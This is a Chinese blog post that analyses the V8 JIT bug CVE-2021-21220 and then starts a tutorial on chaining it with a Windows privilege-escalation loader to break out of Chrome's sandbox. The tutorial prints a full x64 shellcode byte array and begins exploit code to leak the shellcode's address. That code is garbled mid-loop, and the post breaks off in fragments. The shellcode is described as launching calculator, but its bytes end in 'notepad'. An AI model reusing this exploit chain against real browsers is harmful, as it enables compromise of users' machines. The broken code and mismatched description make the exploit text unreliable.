在JIT的优化过程中，存在两个问题：
**1.将b[0]转化为int64，把符号去掉了，从Turbo流程图看，是通过`ChangeInt32ToInt64`来改变b[0]的变量类型，而在这个opcode实现的代码中：**
    void InstructionSelector::VisitChangeInt32ToInt64(Node* node) {
      ......
        switch (rep) {
          case MachineRepresentation::kBit:  // Fall through.
          case MachineRepresentation::kWord8:
            opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq;
            break;
          case MachineRepresentation::kWord16:
            opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq;
            break;
          case MachineRepresentation::kWord32:
            opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl;
            break;
          default:
            UNREACHABLE();
            return;
        }
    ......
根据上面代码可以看出，如果b[0]是有符号的，那么将会使用`kX64Movsxlq`指令进行转换，如果是无符号的就会使用`kX64Movl`指令进行转换。
b[0]因为是一个uint32类型的变量，所以使用movl进行扩展大小，所以没有扩展其符号，导致出现了问题。
**2.shitf函数将数组长度设置为-1。**
shift函数的正常逻辑是，判断数组的长度，如果其长度大于0，并且小于100，那么将会对长度的赋值进行优化，预测其长度，然后进行减1操作，直接写入数组的长度。
在JIT的预测当中，x的值为0，因为其预测是按照没有bug的情况进行预测的，但是实际情况x为1，这就导致实际情况的x通过了shitf的长度检查，然后却把x认为是0，从而-1，把数组的长度设置为了-1。
# CVE-2021-21220总结
该漏洞的成因还是挺容易理解的，这研究其原理的过程中也要学会看Turbo，后续将为专门看Turbo的opcode写一篇paper。
# Windows Chrome利用一条龙
接下来再记录一下v8漏洞在Windows实际的利用。
v8只是Chrome浏览器解析JavaScript代码的一个引擎，就算通过v8代码漏洞，能执行shellcode，也没办法获取到系统权限，因为在v8引擎的外层还一层沙箱，所以在v8漏洞的分析利用文章中，最后显示的效果都需要让Chrome启动加上`--no-sandbox`参数，所以v8漏洞的实际利用场景只能找一些使用了Chrome内核，并且没有开沙箱的应用。
除此之前，v8需要结合一些其他的漏洞，比如沙箱逃逸/提权漏洞，才能真正打穿Chrome。
本文说说，在Windows的环境下，怎么编写exp来结合Windows提权漏洞，来打穿Chrome。
1.你真正想执行的shellcode：
    // shellcode.js
    let usershellcode=[0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,0x65,0x70,0x61,0x64,0x0,0x0];
把一个弹计算器的shellcode设置一个变量，储存在`shellcode.js`中
2.找一个Windows大哥，写一个Windows提权的loadpe（这部分内容后续会让我同事进行编写），并且写入loadpe中，loadpe的二进制将会写入dll.js。
    // dll.js
    let dll=[......];
这loadpe在进行Windows提权后，将会执行shellcode.js中的shellcode，而shellcode的地址，我们需要在exp中泄漏出来：
    var myshell = new Uint8Array(0x1000);
    for (i = 0x0; i = addr_offset && i 
  2. 
* * *